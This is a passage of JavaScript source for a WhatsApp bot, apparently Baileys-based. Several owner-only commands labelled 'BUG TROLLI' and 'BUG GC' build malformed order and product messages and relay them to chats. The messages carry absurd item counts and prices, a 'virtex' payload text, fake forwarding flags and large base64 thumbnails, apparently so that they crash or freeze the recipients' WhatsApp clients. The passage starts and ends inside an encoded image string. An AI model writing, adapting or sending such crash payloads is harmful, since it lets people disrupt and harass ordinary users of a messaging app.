G84e1B7yy51t4piqyL1jYHoavvsv1q21SWb6SIxfKoIQ9+uSo+6pc5tpw0y44cMIyjmtSX9mm6bqdpqCt9FlDFeo6EVzqmqWtgoFxKFYjIUbk/Kq9ofKOKNQZMLGFOQBtnI/vTWisdTvb24mhZvFPKJT0jXuB64xULPJpL27/o6Jf4/HGcpd8Uk/336J4TLMIpEzyuAwyMbGozUbxrrVhZRHCpgNjrnvR9pKlwIZI1KxsPdB8qjtAsWTU9RupM80kxwD2866U7SPLnHjJosUESqqIowqjFYz7f7gPrem2oP/JgLkerN/8AmtthXFfOHtYv/p/Gt+ynKwkQj5Df8c02ZlNXrXrdcivOlI0gD9A0yTWdXttPgkjjlnblVpM8oPrilXOh3p03WbK9XrBMkmPMAgkUqEBdtCbk12xOcZlA+/atWiBiYNGSrDoRWRWT+Fqdo/2ZkP8A5CtdoQE/purq4Ed0Qj9A3Y/tUo8yDuDmqS5G3qadinliAEcjAeXaiwLX4gBJXpTc7wyLlm5TUHHqLDaRM+qnFdnUbf8Arcqe/MtDaWxpXo81B+Zfd7HrUnaxGRFcH3GANQ9xfWbIQLhMntT2i6qnI8KEP4e4x5Uclex8XWhzi6IroUoUFizKAAPWhtft2Oi6facp5pJIoyPlVlhmEqBlPUV0aiWPk2/ydWHyvjjFV9rbKvqzMOLtOUA8ip5bb5/tXGp2F9a63/EtNiE3OOV4871ZnJOwr1RUvCnff7NI+c4cajpU/wBlesf4td6iJ7sG1tVGPBDZ5qJt5buLX3imcG1kjLRjbty5/Opd12ocW8YuWn5SZSoXJPQeQqljr2Zy8lTbuKSqlRFNw+k7apHeLFLZ3hDBOpB33/GsN4p4c1HgnWYrq1kbwefmgmXt/pNfSKHbeo/XNIttWsJbS8jEkTjG46VUYqKpGGTLLI+Utme+zzXYNUFxcmVRfNgyw4xjfqN9x0q2aPpctnJdGCdTBKMxoRnlb1rEuItG1HgfiBJrdm8LmzDL2YfZNbLwBxDa8Q6UZYWVbhMCWLO6H9vWpWKKr9Gr8zLK7e6X8aJeSEW6xBMkJgZPenLRQzSMuxLk0RNHlTneoqG/tbK5Zb2dIFdvdMhwCfLNaaOdtydsmZ3MNpJIQchSa+TNWna6v7m4fPNLKznPqa+r768tXsXKXMLIR1EgI/OsM4j4WfUFmlso0NyZCw7cwz0qJZFFpMcYOSbRm2KXbepa64d1e1J8XT7jHmqcw/Chv4Vf+G7m0nVEGWZkKgD50+SJpgApUqVOxFzmYqeYHcHIrZkYOgdcYYZFKlQA3LzcuVUscjYGvA0pA/ksf/kKVKkB7mTO8LD5im54iyEjO/nSpVll9G2Eh543V6kOHreTxJLvfY+Go8/M0qVYYUuZ0Zn9FlotLgxN/pqXSUSICvQ0qVdxxI9ArvG1KlQAj0rjHpSpUAedOldg5G/lSpUARfEWgWev6fJZ30fMjDZh1U+Yr5/vbfVPZzxaGhfxFQ+63RZk8jSpUAbnw9xDZ6/pMd5Zt7rbMh6o3cGs+9sbkTaPEGwrmViPPHL+9KlUy0VHpld4LszJqcrkAhQF++tOtrUIF2GcUqVcaVybOtukkEEKOwqpe0GZYuH7sjbKFR86VKq9kPRh+PKlSpV1nIf/2Q==",
"itemCount": 1000000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "GUA GK NGERTI",
"message":"entah lah gua nob",
"sellerJid": "6288224859350@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "Rp 25.000.00",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:bugtrol, contextInfo:{}}) 

Ramdani.toggleDisappearingMessages(from, 'Awoakwoakwoak')
Ramdani.relayWAMessage(res)
break
case 'plp':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
res = await Ramdani.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
"description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
"buttonText": danz,
"listType": "SINGLE_SELECT",
"sections": [
{
"title": danz,
"rows": [
{
"title": "Banned",
"rowId": "Banned"
}
]
}
]
}
}, {quoted:mek})
Ramdani.relayWAMessage(res)
break   
case 'pcp':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (!mek.key.fromMe && !isOwner) return
buf = Mfake
imeu = await Ramdani.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Ramdani.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "150453297177375",
"title": `${namabot} ~ 404 ${danz}`,
"description": `${virtex}`,
"currencyCode": "IDR",
"priceAmount1000": "99999999999999999999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "6289512545999@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:bugtrol, contextInfo:{}}) 

Ramdani.relayWAMessage(res)
break
// Bug Trolli 
case 'psp':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned) // BUG TROLLI + BUG GC + TROLLI
if (!mek.key.fromMe && !isOwner) return
buf = Mfake
imeu = await Ramdani.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Ramdani.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": "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",
"itemCount": 1000000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "GUA GK NGERTI",
"message":"entah lah gua nob",
"sellerJid": "6289512545999p.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:bugtrol, contextInfo:{}}) 

Ramdani.toggleDisappearingMessages(from, 'Awoakwoakwoak')
Ramdani.relayWAMessage(res)
break  
case 'p': // TROLLI
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
buf = Mfake
imeu = await Ramdani.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Ramdani.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "150453297177375",
"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCADIAMgDASIAAhEBAxEB/8QAHAAAAQUBAQEAAAAAAAAAAAAABAADBQYHAgEI/8QAQBAAAgEDAgQDBAgEBAUFAAAAAQIDAAQRBSEGEjFBE1FhByJxgRQyUpGhscHRFSNC4SRDYvAWM2NyojRzgrLi/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAJxEAAgICAgIBBAIDAAAAAAAAAAECEQMxEiEEQRMiMlFhkaEFcYH/2gAMAwEAAhEDEQA/AJmRqFkOdh1rtztTEjd+9MRGXxO9Q0pwSal7vLZABJOwA3p6w4T1a/IIt/AjP9U3u/h1oGOcNXkY0q8sQj+NOT74GQFIx/v41axrVhDbxRyXG+MEsuO1O6FwbbacPEklkmuD1Ye6o+Ary64KsZySGmDHuXzQBO6RKj2MRUho5F5wexBNEtZK8jOsvIW35StB6fBd2NtBbrAkkcKhFxJjIHTqKOFzKN2snz/pZSabVjTGzYSA7SIa8axnHTlPzp1rwEe/bXK/Bc0hqFugwwnX/uib9qVIdsYNrOP8vPwNcNFKv1o2+6iDqNkzZ+liPHYnGfvoDXeJbDSLB7qW5V1H1VRgSx8qKQWxrULyHT7WSe5JjiQZYms81X2msj8um2KMv2536/IfvVP4p4mvuI7xpbuZlt8+5AG91R+pqDDJnlHMR91RQy4z+0TW5GHI1tEPJE/eh/8AjLiB3DG7OP8A2xiq8sSBc7ketd5A+ocfCgC5abx7ewsPp0aMD/Um34VeNG4htdUUGNwJiN0J3rEzIc7tn5Ubp1vf/SEk09iGByMGk+gXZu5ZSobJwd81Fa7fx2VhNO2SFHQd/Sq3YcXIgW3vAIplAByM70Dx/qgl0NBC4bncczA7DairDRRtU1GW9uZJZX5mY+8fL0FAMzSrzHZew8zTOeeTkHfrRC9cge6o2Hma0RLBnHgnI3bqSa9Zg6hvP8DTsqc5OaGaN4ySoyMbigR2p5zg9fhSpRlSRzDHkR2pUAbja6feXn/p7d3H2sYH31MWPCMjnmv5gi/Yj3J+dSeizE6Va8pP1Ox9aPEzg9Wx8aYDen6LZWJDW8Kh/ttu330f4R8wRQouZB32+FOLdsBvj7qACPC9KXhfGmRdnuAa6W7X+paAH1Q46mveU+eflTK3MQ7EV2LmL7X4UAdlT6V4QfgO9ITRnfnWm5powvVT6ZoAi9f1a30mykmuSPcGeUnrXz5xTrc2uak9xJ7sIOEUDAx51O+0nX3vtVkgjcmFTjlB+sao7BnPvH4AVDdlIRYV3CeY9T8hXBXk6iukYnz+QoAKB7An503IT0DN8qUSNIcDp38qe8JYyMjLedACs7cvKC+Wx1zUxbar4RZYlCAbAiouWTkh8NRjO5PemOmw60uN7HdBV1OZZPFY7t1qOurqTkMLNzRE5A8jT4PulT8ai7r3Xxn3e1UlRJ2jcmWHU7UQhPKB5fnQUR5mHkKKVsKp9c0xDwIU79t6ctLZ7p8BSR2puOJpZuRerd607hLQI4bdXkQcx6ZqJzo0hCzOb3SZ7dS3IcDcjFKtf1TTI5oWygzjcUqj5WtlvF+AWHV7y2iWOCbCL0XAOKdHE+ooPrxsB5rUJNMkf1iPhUdc3buuF90YrVswNBfXL6GLneGKRfJVOTRB12VE5ns89Nlk9fhTcHgx6XbXE3NytEhJAz1A7Cibm3UQnAyNvzp9jHE1uJvrW0y/ca6XWLXqRKvxWmvogKjpXJtNsBRTphaDF1a0b/OI+KmnBqFq3S4j+ZxUabId0rg2IH9B+6jsOibWeJx7ksbD0Iqk8ccVwadA0MDCS6cEbdFrriRY7HTXmchFGxJ2rHdQu/pN08h2ycKPIfCpbY0jyWRpJGkcks3UmuUB/pBLdgBRFrZSzMvOCinz61N2dtEHEVvGJGHYdPmazlOjSMGyHj01zF40+AD0XuakLDQ5px4jIVQ+lW3TND5mWa7xJL2GPdUegovW5Bb2awwLhmPIoHc96z+Rs0+NIo9xEiOYoF9xDgnzNRvMWmIHn3qzXlmLS0bb3gNzj7/9+lV/ToTLdHY7b1pGXVmcouwaUlW37U3zHmp69U+PIF7b0Ez43860Rk0ESH3FYdajLz623TrRfPzQMCehoGRuZcHtTGdRbY88GnWcBQM9KGB2yK9D9qCSe0B1e+i8Q9962XRmCwoOmMVgVvM0TiRDgitS4T19Lq3VXcCUdfWsMqafI6MLtUX2UBunlmlTFrMJAPWlUbNDOHJyT1oaSn5NgaGffPlXQcaNZ0NFl0WxLb/yEH4CpC4XmgcDY4OCO1RvCjFuHrE/9MD8alH+qRjrWgFFvNc1O0uIEE+VdypDKD2r2Tii/iBJELfFP2NCcRLh7Vv+tj8DUTeNhDWatIGWCLjS52ElpCw81Yj96kU4sUf82zYeqyZ/SqCDipg75ocmgSHeOtds9T0c2xMlsedW5pMYPXbb51TdP0o3WoBIcCAqG8Qb8yjv99EcQWwu5UichUxztITgIB3/AB6ULpetjR7J